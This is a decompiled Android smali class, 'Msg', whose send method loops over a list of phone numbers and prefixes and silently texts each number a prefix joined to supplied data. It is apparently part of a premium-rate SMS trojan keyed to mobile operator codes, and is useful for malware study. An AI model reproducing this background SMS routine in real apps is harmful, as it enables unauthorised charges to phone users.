.class public Lcom/software/application/Msg;
.super Ljava/lang/Object;
.source "Msg.java"


# instance fields
.field private actScheme:Lcom/software/application/Scheme;


# direct methods
.method public constructor <init>(Lcom/software/application/Scheme;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "actScheme"    # Lcom/software/application/Scheme;
    .param p2, "mcc"    # Ljava/lang/String;
    .param p3, "mnc"    # Ljava/lang/String;

    .prologue
    .line 15
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 16
    iput-object p1, p0, Lcom/software/application/Msg;->actScheme:Lcom/software/application/Scheme;

    .line 17
    return-void
.end method


# virtual methods
.method public send(Landroid/app/PendingIntent;Ljava/lang/String;)V
    .locals 8
    .param p1, "s"    # Landroid/app/PendingIntent;
    .param p2, "data"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 20
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 21
    .local v0, "sms":Landroid/telephony/SmsManager;
    iget-object v1, p0, Lcom/software/application/Msg;->actScheme:Lcom/software/application/Scheme;

    iget-object v1, v1, Lcom/software/application/Scheme;->list:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :goto_0
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-nez v1, :cond_0

    .line 26
    return-void

    .line 21
    :cond_0
    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/util/Pair;

    .line 22
    .local v6, "pair":Landroid/util/Pair;, "Landroid/util/Pair<Ljava/lang/String;Ljava/lang/String;>;"
    new-instance v4, Ljava/lang/StringBuilder;

    iget-object v1, v6, Landroid/util/Pair;->second:Ljava/lang/Object;

    check-cast v1, Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "+"

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 23
    .local v3, "smsText":Ljava/lang/String;
    iget-object v1, v6, Landroid/util/Pair;->first:Ljava/lang/Object;

    check-cast v1, Ljava/lang/String;

    move-object v4, p1

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0
.end method
